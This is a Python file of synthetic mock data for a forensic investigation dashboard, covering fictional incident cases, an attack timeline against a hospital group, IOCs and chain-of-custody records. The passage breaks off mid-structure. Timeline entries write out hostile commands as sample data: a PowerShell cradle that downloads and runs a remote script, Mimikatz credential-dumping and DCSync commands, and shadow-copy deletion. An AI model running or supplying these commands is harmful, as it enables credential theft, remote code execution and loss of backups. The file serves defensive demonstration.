"""
EY DFIR AutoChain — Realistic Mock Data Engine
All data is synthetic for demonstration. Generated deterministically via seed.
"""

from __future__ import annotations
import random
from datetime import datetime, timedelta, timezone
from typing import Any

random.seed(42)

# ── Helpers ────────────────────────────────────────────────────────────────
def _ts(days_ago: float, hours_offset: float = 0) -> str:
    dt = datetime.now(timezone.utc) - timedelta(days=days_ago, hours=hours_offset)
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")

def _date(days_ago: float) -> str:
    dt = datetime.now(timezone.utc) - timedelta(days=days_ago)
    return dt.strftime("%Y-%m-%d")

def _spark(base: float, trend: str = "up", noise: float = 0.12) -> list[float]:
    """Generate 7-point sparkline data."""
    vals, v = [], base * (0.65 if trend == "up" else 1.2)
    for i in range(7):
        v *= (1 + random.uniform(-noise, noise))
        if trend == "up":   v = min(v * 1.06, base * 1.6)
        elif trend == "down": v = max(v * 0.96, base * 0.5)
        vals.append(round(abs(v), 1))
    vals[-1] = base
    return vals

# ── TACTIC COLOR MAP ───────────────────────────────────────────────────────
TACTIC_COLORS: dict[str, str] = {
    "Initial Access":        "#FF4D4F",
    "Execution":             "#FA8C16",
    "Persistence":           "#FADB14",
    "Privilege Escalation":  "#52C41A",
    "Defense Evasion":       "#13C2C2",
    "Credential Access":     "#1890FF",
    "Discovery":             "#722ED1",
    "Lateral Movement":      "#EB2F96",
    "Collection":            "#F5222D",
    "Command and Control":   "#FF7A45",
    "Exfiltration":          "#FFC53D",
    "Impact":                "#CF1322",
}

# ── CASES ─────────────────────────────────────────────────────────────────
CASES: list[dict[str, Any]] = [
    {
        "id": "CASE-2024-001",
        "title": "ALPHV BlackCat Ransomware — Meridian Healthcare",
        "type": "Ransomware",
        "risk": "CRITICAL",
        "status": "ACTIVE",
        "investigator": "J. Nakamura",
        "client": "Meridian Healthcare Group",
        "created": _date(12),
        "last_activity": _ts(0.5),
        "evidence_count": 47,
        "ioc_count": 312,
        "timeline_events": 1847,
        "attribution": "ALPHV / BlackCat",
        "attribution_confidence": 87,
        "description": (
            "Ransomware incident affecting 14 hospitals across 3 states. ALPHV BlackCat variant "
            "deployed via compromised VPN credentials. 2.3 TB of patient data exfiltrated prior "
            "to encryption. Initial access through spearphishing email exploiting CVE-2024-21413."
        ),
        "incident_date": _date(13),
        "tags": ["ransomware", "healthcare", "double-extortion", "alphv", "hipaa"],
        "ttps": ["T1486", "T1490", "T1078", "T1059.001", "T1003.001", "T1071.001", "T1547.001", "T1041"],
        "damage": "$4.2M estimated ransom + $8.7M remediation",
        "affected_systems": 847,
        "dwell_days": 21,
    },
    {
        "id": "CASE-2024-002",
        "title": "APT29 Cozy Bear — Supply Chain Compromise",
        "type": "APT / Espionage",
        "risk": "CRITICAL",
        "status": "ACTIVE",
        "investigator": "S. Okonkwo",
        "client": "Nexus Defense Technologies",
        "created": _date(31),
        "last_activity": _ts(2),
        "evidence_count": 89,
        "ioc_count": 521,
        "timeline_events": 3201,
        "attribution": "APT29 / Cozy Bear",
        "attribution_confidence": 73,
        "description": (
            "Nation-state espionage campaign targeting defense contractor. Attackers maintained "
            "persistent access for 8+ months via trojanized software update mechanism. "
            "SUNBURST-style implant discovered in build pipeline."
        ),
        "incident_date": _date(45),
        "tags": ["apt29", "nation-state", "supply-chain", "espionage", "russia"],
        "ttps": ["T1195.002", "T1078", "T1059.001", "T1547.001", "T1027", "T1573.001", "T1003.006"],
        "damage": "Classified research data exfiltrated — NDV critical",
        "affected_systems": 234,
        "dwell_days": 247,
    },
    {
        "id": "CASE-2024-003",
        "title": "Business Email Compromise — FirsTech Capital",
        "type": "BEC / Financial Fraud",
        "risk": "HIGH",
        "status": "ACTIVE",
        "investigator": "M. Rodriguez",
        "client": "FirsTech Capital Partners",
        "created": _date(5),
        "last_activity": _ts(4),
        "evidence_count": 23,
        "ioc_count": 78,
        "timeline_events": 341,
        "attribution": "TA505 (suspected)",
        "attribution_confidence": 41,
        "description": (
            "CFO email account compromised via MFA fatigue attack. $2.1M wire transfer "
            "fraudulently initiated to foreign accounts. Attacker impersonated CEO in "
            "follow-up messages to accelerate transfer approval."
        ),
        "incident_date": _date(6),
        "tags": ["bec", "wire-fraud", "mfa-bypass", "financial", "ta505"],
        "ttps": ["T1566.002", "T1098", "T1114", "T1534", "T1041", "T1539"],
        "damage": "$2.1M wire fraud — $1.4M recovered",
        "affected_systems": 12,
        "dwell_days": 3,
    },
    {
        "id": "CASE-2024-004",
        "title": "Insider Threat — Privileged Data Exfiltration",
        "type": "Insider Threat",
        "risk": "HIGH",
        "status": "ACTIVE",
        "investigator": "J. Nakamura",
        "client": "Apex Pharmaceuticals Inc.",
        "created": _date(18),
        "last_activity": _ts(24),
        "evidence_count": 31,
        "ioc_count": 45,
        "timeline_events": 892,
        "attribution": "Insider — Sr. Research Scientist",
        "attribution_confidence": 94,
        "description": (
            "Disgruntled employee systematically exfiltrated proprietary drug formulas before "
            "departure to a competitor. 47 GB transferred to personal cloud storage over 3 weeks "
            "using encrypted channels to evade DLP monitoring."
        ),
        "incident_date": _date(21),
        "tags": ["insider", "data-theft", "dlp", "exfiltration", "pharma"],
        "ttps": ["T1078", "T1048.003", "T1052", "T1560", "T1005", "T1083"],
        "damage": "IP theft — estimated $180M R&D value at risk",
        "affected_systems": 8,
        "dwell_days": 24,
    },
    {
        "id": "CASE-2024-005",
        "title": "Lazarus Group — Cryptocurrency Exchange Heist",
        "type": "APT / Financial Crime",
        "risk": "CRITICAL",
        "status": "CONTAINED",
        "investigator": "A. Petrov",
        "client": "Quantum Exchange Ltd.",
        "created": _date(22),
        "last_activity": _ts(48),
        "evidence_count": 62,
        "ioc_count": 287,
        "timeline_events": 2104,
        "attribution": "Lazarus Group / DPRK",
        "attribution_confidence": 81,
        "description": (
            "North Korean threat actor targeted cryptocurrency exchange using zero-day exploit "
            "in trading platform API. Sophisticated multi-stage attack with custom implants. "
            "$47M in cryptocurrency assets drained to DPRK-controlled wallets."
        ),
        "incident_date": _date(24),
        "tags": ["lazarus", "dprk", "crypto", "zero-day", "nation-state"],
        "ttps": ["T1566.001", "T1055.001", "T1059.003", "T1070.004", "T1041", "T1657"],
        "damage": "$47M cryptocurrency stolen",
        "affected_systems": 156,
        "dwell_days": 14,
    },
    {
        "id": "CASE-2024-006",
        "title": "FIN7 — POS Malware Campaign at Retail Chain",
        "type": "Financial Crime / POS",
        "risk": "HIGH",
        "status": "CONTAINED",
        "investigator": "S. Okonkwo",
        "client": "RetailMax Corporation",
        "created": _date(42),
        "last_activity": _ts(120),
        "evidence_count": 41,
        "ioc_count": 189,
        "timeline_events": 1523,
        "attribution": "FIN7 / Carbanak",
        "attribution_confidence": 76,
        "description": (
            "FIN7 deployed custom POS malware (Carbanak variant) across 1,247 retail "
            "locations via targeted spearphishing of IT helpdesk staff. ~3.2M payment "
            "cards compromised over 6-week dwell period."
        ),
        "incident_date": _date(48),
        "tags": ["fin7", "carbanak", "pos-malware", "payment-cards"],
        "ttps": ["T1566.001", "T1059.001", "T1543.003", "T1056.001", "T1041"],
        "damage": "3.2M payment cards — PCI DSS breach",
        "affected_systems": 1247,
        "dwell_days": 42,
    },
    {
        "id": "CASE-2024-007",
        "title": "Spearphishing Campaign — Blackwood & Associates LLP",
        "type": "Phishing / Credential Theft",
        "risk": "MEDIUM",
        "status": "ACTIVE",
        "investigator": "M. Rodriguez",
        "client": "Blackwood & Associates LLP",
        "created": _date(3),
        "last_activity": _ts(12),
        "evidence_count": 15,
        "ioc_count": 43,
        "timeline_events": 187,
        "attribution": "Unknown / Criminal",
        "attribution_confidence": 22,
        "description": (
            "Targeted spearphishing campaign against senior partners at top-tier law firm. "
            "7 attorney email accounts compromised. Sensitive attorney-client privileged "
            "communications accessed and staged for potential sale."
        ),
        "incident_date": _date(4),
        "tags": ["phishing", "credentials", "legal-sector", "acp"],
        "ttps": ["T1566.001", "T1078", "T1114", "T1539"],
        "damage": "Attorney-client privileged data accessed",
        "affected_systems": 7,
        "dwell_days": 4,
    },
    {
        "id": "CASE-2024-008",
        "title": "LOTL Attack — Government Agency Compromise",
        "type": "APT / Living-off-the-Land",
        "risk": "HIGH",
        "status": "RESOLVED",
        "investigator": "A. Petrov",
        "client": "Confidential Government Client",
        "created": _date(67),
        "last_activity": _ts(240),
        "evidence_count": 74,
        "ioc_count": 156,
        "timeline_events": 2891,
        "attribution": "APT41 (suspected)",
        "attribution_confidence": 58,
        "description": (
            "Advanced persistent threat using exclusively living-off-the-land techniques. "
            "PowerShell, WMI, and scheduled tasks used for persistence and lateral movement. "
            "No custom malware deployed — evaded AV/EDR for 13 weeks."
        ),
        "incident_date": _date(80),
        "tags": ["lotl", "apt41", "government", "wmi", "powershell"],
        "ttps": ["T1059.001", "T1047", "T1053.005", "T1021.001", "T1003.001"],
        "damage": "Classified documents accessed — Tier 2 incident",
        "affected_systems": 89,
        "dwell_days": 91,
    },
]

# ── TIMELINE EVENTS ────────────────────────────────────────────────────────
TIMELINE_EVENTS: list[dict[str, Any]] = [
    # ── Phase 1: Initial Access ──
    {
        "id": "EVT-001", "case_id": "CASE-2024-001",
        "ts": _ts(12, 8.2), "tactic": "Initial Access", "technique": "T1566.001",
        "technique_name": "Spearphishing Attachment",
        "host": "WORKSTATION-047", "user": "j.morrison@meridian.org",
        "desc": "Malicious .xlsx attachment opened — CVE-2024-21413 RCE exploit triggered via malformed OLECF",
        "detail": "SHA256: a3f1c2d4...1234. Subject: 'Q4 Benefits Update'. Sender: hr-benefits@meridian-update.com",
        "risk": 9.2, "source": "Email Gateway / EDR", "is_anomaly": True,
    },
    {
        "id": "EVT-002", "case_id": "CASE-2024-001",
        "ts": _ts(12, 8.0), "tactic": "Initial Access", "technique": "T1078",
        "technique_name": "Valid Accounts — VPN",
        "host": "VPN-GW-01", "user": "b.chen@meridian.org",
        "desc": "VPN authentication success from anomalous geolocation: 95.142.47.100 (Sofia, Bulgaria)",
        "detail": "User last 30 logins from US/CA. No travel notice. MFA approved after 11 push notifications.",
        "risk": 7.2, "source": "VPN / AAD Logs", "is_anomaly": True,
    },
    # ── Phase 2: Execution ──
    {
        "id": "EVT-003", "case_id": "CASE-2024-001",
        "ts": _ts(12, 7.9), "tactic": "Execution", "technique": "T1059.001",
        "technique_name": "PowerShell",
        "host": "WORKSTATION-047", "user": "j.morrison@meridian.org",
        "desc": "Encoded PowerShell stager executed — downloads ALPHV loader from C2",
        "detail": "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/st4g3r.ps1') | -EncodedCommand",
        "risk": 9.8, "source": "EVTX:4688", "is_anomaly": True,
    },
    {
        "id": "EVT-004", "case_id": "CASE-2024-001",
        "ts": _ts(12, 7.85), "tactic": "Defense Evasion", "technique": "T1027",
        "technique_name": "Obfuscated Files / AMSI Bypass",
        "host": "WORKSTATION-047", "user": "j.morrison@meridian.org",
        "desc": "AMSI bypass via memory patching — amsi.dll!AmsiScanBuffer patched to RET 0",
        "detail": "Process: powershell.exe (PID 4812). Patch: 0x74 0x02 at AmsiScanBuffer+0x1E",
        "risk": 8.5, "source": "EDR Telemetry", "is_anomaly": True,
    },
    # ── Phase 3: Persistence ──
    {
        "id": "EVT-005", "case_id": "CASE-2024-001",
        "ts": _ts(12, 7.7), "tactic": "Persistence", "technique": "T1547.001",
        "technique_name": "Registry Run Keys",
        "host": "WORKSTATION-047", "user": "SYSTEM",
        "desc": r"Autorun registry key created: Run\Updater → C:\Users\jmorrison\AppData\Roaming\svchost32.exe",
        "detail": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater — size: 247 KB, entropy: 7.8",
        "risk": 8.1, "source": "Registry Monitor", "is_anomaly": True,
    },
    {
        "id": "EVT-006", "case_id": "CASE-2024-001",
        "ts": _ts(12, 7.6), "tactic": "Persistence", "technique": "T1053.005",
        "technique_name": "Scheduled Task",
        "host": "WORKSTATION-047", "user": "SYSTEM",
        "desc": "Scheduled task created: 'WindowsDefenderUpdate' — runs daily at 02:00",
        "detail": "schtasks /create /tn WindowsDefenderUpdate /tr C:\\Temp\\upd.ps1 /sc daily /st 02:00 /ru SYSTEM",
        "risk": 7.5, "source": "EVTX:4698", "is_anomaly": True,
    },
    # ── Phase 4: Privilege Escalation ──
    {
        "id": "EVT-007", "case_id": "CASE-2024-001",
        "ts": _ts(12, 7.5), "tactic": "Privilege Escalation", "technique": "T1134",
        "technique_name": "Access Token Manipulation",
        "host": "WORKSTATION-047", "user": "j.morrison@meridian.org",
        "desc": "Token impersonation: svchost32.exe impersonated NT AUTHORITY\\SYSTEM token via SeImpersonatePrivilege",
        "detail": "Source PID: 4812 (powershell.exe) → Target: NT AUTHORITY\\SYSTEM. Privilege: SeImpersonatePrivilege",
        "risk": 9.0, "source": "EVTX:4624", "is_anomaly": True,
    },
    # ── Phase 5: Credential Access ──
    {
        "id": "EVT-008", "case_id": "CASE-2024-001",
        "ts": _ts(12, 7.2), "tactic": "Credential Access", "technique": "T1003.001",
        "technique_name": "LSASS Memory Dump",
        "host": "WORKSTATION-047", "user": "SYSTEM",
        "desc": "Mimikatz sekurlsa::logonpasswords executed — handle opened to lsass.exe (PID 892)",
        "detail": "OpenProcess(PROCESS_ALL_ACCESS, lsass.exe) — 6 credential sets extracted. Dump: C:\\Temp\\lsass.dmp",
        "risk": 10.0, "source": "EVTX:4656", "is_anomaly": True,
    },
    # ── Phase 6: Discovery ──
    {
        "id": "EVT-009", "case_id": "CASE-2024-001",
        "ts": _ts(12, 6.9), "tactic": "Discovery", "technique": "T1087.002",
        "technique_name": "Domain Account Discovery",
        "host": "WORKSTATION-047", "user": "SYSTEM",
        "desc": "Active Directory enumeration via net commands + LDAP queries",
        "detail": "net user /domain | net group 'Domain Admins' /domain | nltest /dclist: — 847 user objects found",
        "risk": 6.5, "source": "EVTX:4688", "is_anomaly": False,
    },
    {
        "id": "EVT-010", "case_id": "CASE-2024-001",
        "ts": _ts(12, 6.8), "tactic": "Discovery", "technique": "T1046",
        "technique_name": "Network Service Scanning",
        "host": "WORKSTATION-047", "user": "SYSTEM",
        "desc": "Internal network scan: 192.168.0.0/16 — ports 22, 80, 443, 445, 3389, 5985",
        "detail": "4,096 hosts scanned. 847 responsive. 234 with RDP open. 89 with WinRM open.",
        "risk": 6.0, "source": "NetFlow / IDS", "is_anomaly": True,
    },
    # ── Phase 7: Lateral Movement ──
    {
        "id": "EVT-011", "case_id": "CASE-2024-001",
        "ts": _ts(12, 6.5), "tactic": "Lateral Movement", "technique": "T1550.002",
        "technique_name": "Pass the Hash",
        "host": "DC-MERIDIAN-01", "user": "ADMINISTRATOR",
        "desc": "Pass-the-Hash using harvested NTLM hash — authenticated to Domain Controller",
        "detail": "NTHash: aad3b435b51404eeaad3b435b51404ee:8d969eef6ecad3c29a3a629280e686cf. Logon Type 3.",
        "risk": 9.5, "source": "EVTX:4624 Type:3", "is_anomaly": True,
    },
    {
        "id": "EVT-012", "case_id": "CASE-2024-001",
        "ts": _ts(12, 6.3), "tactic": "Lateral Movement", "technique": "T1021.001",
        "technique_name": "Remote Desktop Protocol",
        "host": "HOSPITAL-SERVER-04", "user": "ADMINISTRATOR",
        "desc": "RDP lateral movement from DC-MERIDIAN-01 to 4 hospital servers",
        "detail": "mstsc.exe /v:192.168.10.47:3389 /admin — HOSPITAL-SERVER-{01,04,07,12} accessed sequentially",
        "risk": 7.8, "source": "EVTX:4624", "is_anomaly": True,
    },
    # ── Phase 8: Credential Access (DC) ──
    {
        "id": "EVT-013", "case_id": "CASE-2024-001",
        "ts": _ts(12, 6.0), "tactic": "Credential Access", "technique": "T1003.006",
        "technique_name": "DCSync",
        "host": "DC-MERIDIAN-01", "user": "ADMINISTRATOR",
        "desc": "DCSync attack: complete Active Directory credential dump via replication rights",
        "detail": "lsadump::dcsync /all /csv — 847 NTLM hashes + Kerberos keys extracted. Including krbtgt account.",
        "risk": 10.0, "source": "EVTX:4662", "is_anomaly": True,
    },
    # ── Phase 9: Persistence (DC) ──
    {
        "id": "EVT-014", "case_id": "CASE-2024-001",
        "ts": _ts(12, 5.5), "tactic": "Persistence", "technique": "T1543.003",
        "technique_name": "Windows Service",
        "host": "DC-MERIDIAN-01", "user": "SYSTEM",
        "desc": "Malicious service created: 'WinUpdateSvc' — Cobalt Strike beacon as service DLL",
        "detail": "sc create WinUpdateSvc binPath=C:\\Windows\\Temp\\svc.exe start=auto. Size: 892KB, Entropy: 7.94",
        "risk": 8.8, "source": "EVTX:7045", "is_anomaly": True,
    },
    # ── Phase 10: C2 ──
    {
        "id": "EVT-015", "case_id": "CASE-2024-001",
        "ts": _ts(12, 5.0), "tactic": "Command and Control", "technique": "T1071.001",
        "technique_name": "Cobalt Strike HTTPS Beacon",
        "host": "DC-MERIDIAN-01", "user": "SYSTEM",
        "desc": "Cobalt Strike beacon active: HTTPS C2 to 194.165.16.98:443 (Amazon-impersonating certificate)",
        "detail": "Jitter: 23%. Check-in: ~5min. Certificate CN=amazon.com. Malleable C2 profile: jquery-c2.4.2.profile",
        "risk": 9.2, "source": "NetFlow / JA3", "is_anomaly": True,
    },
    # ── Phase 11: Collection / Exfil ──
    {
        "id": "EVT-016", "case_id": "CASE-2024-001",
        "ts": _ts(12, 3.0), "tactic": "Collection", "technique": "T1560.001",
        "technique_name": "Archive via 7-Zip",
        "host": "FILESERVER-02", "user": "ADMINISTRATOR",
        "desc": "Patient records staged and archived: patient_records_2024.7z (2.3 GB, AES-256 encrypted)",
        "detail": "7z.exe a -t7z -mhe=on -p*** patient_records_2024.7z C:\\PatientData\\ — 780,000 records",
        "risk": 8.5, "source": "FS Activity Monitor", "is_anomaly": True,
    },
    {
        "id": "EVT-017", "case_id": "CASE-2024-001",
        "ts": _ts(12, 2.5), "tactic": "Exfiltration", "technique": "T1041",
        "technique_name": "Exfiltration Over C2 Channel",
        "host": "FILESERVER-02", "user": "ADMINISTRATOR",
        "desc": "2.3 GB patient data exfiltrated to 185.220.101.47:443 over 42 minutes via Cobalt Strike",
        "detail": "Total bytes: 2,314,827,776. Duration: 42:17. Avg rate: 912 KB/s. Endpoint: /cdn-static/resources",
        "risk": 9.8, "source": "DLP / NetFlow", "is_anomaly": True,
    },
    # ── Phase 12: Impact ──
    {
        "id": "EVT-018", "case_id": "CASE-2024-001",
        "ts": _ts(12, 1.5), "tactic": "Defense Evasion", "technique": "T1490",
        "technique_name": "Inhibit System Recovery (VSS Delete)",
        "host": "ALL-SERVERS", "user": "SYSTEM",
        "desc": "Shadow copies deleted across all 847 systems — ransomware pre-deployment",
        "detail": "vssadmin.exe delete shadows /all /quiet — executed via GPO push to all domain members",
        "risk": 9.5, "source": "EVTX:4688", "is_anomaly": True,
    },
    {
        "id": "EVT-019", "case_id": "CASE-2024-001",
        "ts": _ts(12, 1.0), "tactic": "Impact", "technique": "T1486",
        "technique_name": "ALPHV BlackCat Ransomware Deployed",
        "host": "ALL-SERVERS", "user": "SYSTEM",
        "desc": "ALPHV ransomware deployed and executing — 847 systems encrypting simultaneously",
        "detail": "Extension: .alphv. Ransom note: RECOVER-FILES.txt. Tor site: alphvmmm27o3abo3r2mlmjrpdmzle3pvc7sbrwjb7uc553tlia7220yd.onion",
        "risk": 10.0, "source": "EDR — All Endpoints", "is_anomaly": True,
    },
    {
        "id": "EVT-020", "case_id": "CASE-2024-001",
        "ts": _ts(11, 22.0), "tactic": "Impact", "technique": "T1657",
        "technique_name": "Ransom Demand",
        "host": "N/A", "user": "ALPHV Operator",
        "desc": "Ransom demand received: $4.2M USD in Bitcoin — 72hr deadline",
        "detail": "Leak site post: Proof of 2.3 TB patient data. 780,000 records. HIPAA exposure. 14 hospitals offline.",
        "risk": 10.0, "source": "Dark Web Monitor", "is_anomaly": True,
    },
]

# ── IOCs ───────────────────────────────────────────────────────────────────
IOCS: list[dict[str, Any]] = [
    {"id": "IOC-001", "type": "IP_ADDRESS",      "value": "185.220.101.47",
     "threat_score": 9.8, "vt_detections": 72, "vt_total": 93, "abuse_confidence": 98,
     "country": "RO", "asn": "AS60781 LeaseWeb", "is_malicious": True,
     "tags": ["c2", "alphv", "tor-exit-relay"], "first_seen": _ts(12, 7.9), "case_id": "CASE-2024-001"},
    {"id": "IOC-002", "type": "IP_ADDRESS",      "value": "194.165.16.98",
     "threat_score": 9.5, "vt_detections": 68, "vt_total": 93, "abuse_confidence": 95,
     "country": "NL", "asn": "AS209588 Serverius", "is_malicious": True,
     "tags": ["c2", "cobalt-strike", "beacon"], "first_seen": _ts(12, 5.0), "case_id": "CASE-2024-001"},
    {"id": "IOC-003", "type": "DOMAIN",          "value": "update-microsoft-patch.com",
     "threat_score": 9.2, "vt_detections": 58, "vt_total": 93, "abuse_confidence": 91,
     "country": "RU", "asn": "AS49505 Selectel", "is_malicious": True,
     "tags": ["phishing", "typosquat", "credential-harvest"], "first_seen": _ts(12, 8.0), "case_id": "CASE-2024-001"},
    {"id": "IOC-004", "type": "FILE_HASH_SHA256", "value": "a3f1c2d4e5b67890abcdef1234567890abcdef1234567890abcdef1234567890",
     "threat_score": 10.0, "vt_detections": 89, "vt_total": 93, "abuse_confidence": 100,
     "country": None, "asn": None, "is_malicious": True,
     "tags": ["alphv", "ransomware", "encryptor", "elf+pe"], "first_seen": _ts(12, 1.0), "case_id": "CASE-2024-001"},
    {"id": "IOC-005", "type": "FILE_HASH_SHA256", "value": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678",
     "threat_score": 9.6, "vt_detections": 81, "vt_total": 93, "abuse_confidence": 97,
     "country": None, "asn": None, "is_malicious": True,
     "tags": ["cobalt-strike", "beacon", "stager", "pe32+"], "first_seen": _ts(12, 7.8), "case_id": "CASE-2024-001"},
    {"id": "IOC-006", "type": "URL",             "value": "http://185.220.101.47/st4g3r.ps1",
     "threat_score": 9.9, "vt_detections": 76, "vt_total": 93, "abuse_confidence": 99,
     "country": "RO", "asn": "AS60781", "is_malicious": True,
     "tags": ["dropper", "ps-stager", "download-cradle"], "first_seen": _ts(12, 7.9), "case_id": "CASE-2024-001"},
    {"id": "IOC-007", "type": "EMAIL",           "value": "hr-benefits@meridian-update.com",
     "threat_score": 8.5, "vt_detections": 41, "vt_total": 93, "abuse_confidence": 85,
     "country": None, "asn": None, "is_malicious": True,
     "tags": ["phishing", "impersonation", "bec-sender"], "first_seen": _ts(12, 9.1), "case_id": "CASE-2024-001"},
    {"id": "IOC-008", "type": "IP_ADDRESS",      "value": "91.214.124.20",
     "threat_score": 8.8, "vt_detections": 52, "vt_total": 93, "abuse_confidence": 88,
     "country": "IR", "asn": "AS48159 TCI", "is_malicious": True,
     "tags": ["apt29", "c2", "exfil-endpoint"], "first_seen": _ts(31, 15.0), "case_id": "CASE-2024-002"},
    {"id": "IOC-009", "type": "DOMAIN",          "value": "microsoft-cdn-update.net",
     "threat_score": 8.2, "vt_detections": 47, "vt_total": 93, "abuse_confidence": 82,
     "country": "DE", "asn": "AS24940 Hetzner", "is_malicious": True,
     "tags": ["apt29", "c2", "dga-like", "typosquat"], "first_seen": _ts(31, 14.0), "case_id": "CASE-2024-002"},
    {"id": "IOC-010", "type": "FILE_HASH_MD5",   "value": "5f4dcc3b5aa765d61d8327deb882cf99",
     "threat_score": 7.8, "vt_detections": 38, "vt_total": 93, "abuse_confidence": 78,
     "country": None, "asn": None, "is_malicious": True,
     "tags": ["loader", "apt29", "dll-sideload"], "first_seen": _ts(31, 16.0), "case_id": "CASE-2024-002"},
    {"id": "IOC-011", "type": "IP_ADDRESS",      "value": "95.142.47.100",
     "threat_score": 6.5, "vt_detections": 22, "vt_total": 93, "abuse_confidence": 65,
     "country": "BG", "asn": "AS204355 DataCenter Inc", "is_malicious": False,
     "tags": ["vpn-exit", "suspicious", "mfa-fatigue"], "first_seen": _ts(12, 9.0), "case_id": "CASE-2024-001"},
    {"id": "IOC-012", "type": "REGISTRY_KEY",    "value": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
     "threat_score": 8.1, "vt_detections": 0, "vt_total": 0, "abuse_confidence": 80,
     "country": None, "asn": None, "is_malicious": True,
     "tags": ["persistence", "autorun", "lolbin"], "first_seen": _ts(12, 7.7), "case_id": "CASE-2024-001"},
]

# ── EVIDENCE ───────────────────────────────────────────────────────────────
EVIDENCE: list[dict[str, Any]] = [
    {
        "id": "EV-2024-001-01", "case_id": "CASE-2024-001",
        "type": "Memory Dump", "icon": "🧠",
        "description": "Full physical memory acquisition — WORKSTATION-047 (primary infection host)",
        "size": "16.0 GB", "tool": "WinPmem v4.0.rc2",
        "sha256": "4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b",
        "md5": "7215ee9c7d9dc229d2921a40e899ec5f",
        "acquired_by": "J. Nakamura", "acquired_at": _ts(12, 0), "integrity": True,
        "custody_chain": [
            {"action": "ACQUIRED",    "icon": "🔒", "by": "J. Nakamura",  "role": "Lead Examiner",        "ts": _ts(12, 0),    "note": "Live memory dump via WinPmem v4.0. Target: WORKSTATION-047. OS: Win11 23H2.", "verified": True},
            {"action": "HASHED",      "icon": "🔐", "by": "J. Nakamura",  "role": "Lead Examiner",        "ts": _ts(11.95, 0), "note": "SHA-256 + MD5 computed on acquisition workstation (offline). Hash recorded in CoC form #EY-2024-001.", "verified": True},
            {"action": "TRANSFERRED", "icon": "📦", "by": "S. Okonkwo",   "role": "Evidence Custodian",   "ts": _ts(11.9, 0),  "note": "Physical transfer to EY Forensic Lab via secure courier. Container: Pelican 1510, EY seal #7821.", "verified": True},
            {"action": "VERIFIED",    "icon": "✅", "by": "S. Okonkwo",   "role": "Evidence Custodian",   "ts": _ts(11.85, 0), "note": "Hash re-verified on receipt at EY lab. SHA-256 match confirmed — PASS.", "verified": True},
            {"action": "ANALYZED",    "icon": "🔬", "by": "J. Nakamura",  "role": "Lead Examiner",        "ts": _ts(11.5, 0),  "note": "Volatility3 analysis: Cobalt Strike beacon injection into svchost.exe. 6 credential sets in LSASS.", "verified": True},
        ],
    },
    {
        "id": "EV-2024-001-02", "case_id": "CASE-2024-001",
        "type": "EVTX Security Logs", "icon": "📋",
        "description": "Windows Security Event Logs — DC-MERIDIAN-01 (Domain Controller)",
        "size": "2.3 GB (1,847 relevant events)", "tool": "KAPE + Chainsaw",
        "sha256": "a3f1c2d4e5b6789012345678abcdef0123456789abcdef0123456789abcdef01",
        "md5": "098f6bcd4621d373cade4e832627b4f6",
        "acquired_by": "M. Rodriguez", "acquired_at": _ts(11.8, 0), "integrity": True,
        "custody_chain": [
            {"action": "ACQUIRED",    "icon": "🔒", "by": "M. Rodriguez", "role": "DFIR Analyst",         "ts": _ts(11.8, 0),  "note": "Remote collection via KAPE (Kroll Artifact Parser). DC-MERIDIAN-01 (192.168.1.10).", "verified": True},
            {"action": "HASHED",      "icon": "🔐", "by": "M. Rodriguez", "role": "DFIR Analyst",         "ts": _ts(11.79, 0), "note": "Dual hash: SHA-256 + MD5. Recorded in EY evidence tracker #EVTX-DC-001.", "verified": True},
            {"action": "TRANSFERRED", "icon": "📦", "by": "A. Petrov",    "role": "Evidence Custodian",   "ts": _ts(11.75, 0), "note": "Uploaded to EY secure evidence vault (AES-256 in transit + at rest).", "verified": True},
            {"action": "VERIFIED",    "icon": "✅", "by": "A. Petrov",    "role": "Evidence Custodian",   "ts": _ts(11.7, 0),  "note": "Hash verified on upload — SHA-256 PASS. Evidence integrity confirmed.", "verified": True},
            {"action": "ANALYZED",    "icon": "🔬", "by": "M. Rodriguez", "role": "DFIR Analyst",         "ts": _ts(11.0, 0),  "note": "Chainsaw + Sigma analysis: 1,847 events parsed. 42 high-confidence anomalies. DCSync, PtH confirmed.", "verified": True},
            {"action": "ARCHIVED",    "icon": "🗄",  "by": "System",       "role": "Automated",            "ts": _ts(10.5, 0),  "note": "Archived to EY long-term evidence storage (7-year retention per EY policy).", "verified": True},
        ],
    },
    {
        "id": "EV-2024-001-03", "case_id": "CASE-2024-001",
        "type": "Forensic Disk Image", "icon": "💾",
        "description": "E01 forensic image — WORKSTATION-047 C: drive (1TB NVMe SSD)",
        "size": "512.3 GB", "tool": "FTK Imager 4.7 (write-blocked)",
        "sha256": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678",
        "md5": "ad0234829205b9033196ba818f7a872b",
        "acquired_by": "J. Nakamura", "acquired_at": _ts(11.5, 0), "integrity": True,
        "custody_chain": [
            {"action": "ACQUIRED",    "icon": "🔒", "by": "J. Nakamura",  "role": "Lead Examiner",        "ts": _ts(11.5, 0),  "note": "FTK Imager 4.7 with Tableau T8u write blocker. E01 format, 4h acquisition.", "verified": True},
            {"action": "HASHED",      "icon": "🔐", "by": "J. Nakamura",  "role": "Lead Examiner",        "ts": _ts(11.45, 0), "note": "Dual hash computed (SHA-256 + MD5) during acquisition. 4h 17m total.", "verified": True},
            {"action": "TRANSFERRED", "icon": "📦", "by": "S. Okonkwo",   "role": "Evidence Custodian",   "ts": _ts(11.4, 0),  "note": "Physical drive sealed in EF evidence bag #EY2024-4721. Chain-of-custody form signed.", "verified": True},
            {"action": "VERIFIED",    "icon": "✅", "by": "S. Okonkwo",   "role": "Evidence Custodian",   "ts": _ts(11.35, 0), "note": "Hash re-verified at EY lab: SHA-256 PASS, MD5 PASS. Seal intact.", "verified": True},
        ],
    },
]

# ── MITRE ATT&CK COVERAGE ──────────────────────────────────────────────────
MITRE_COVERAGE: dict[str, list[dict]] = {
    "Initial Access": [
        {"id": "T1566.001", "name": "Spearphishing Attachment",        "count": 3, "conf": 95, "cases": ["CASE-2024-001","CASE-2024-006","CASE-2024-007"]},
        {"id": "T1566.002", "name": "Spearphishing Link",              "count": 2, "conf": 88, "cases": ["CASE-2024-003","CASE-2024-007"]},
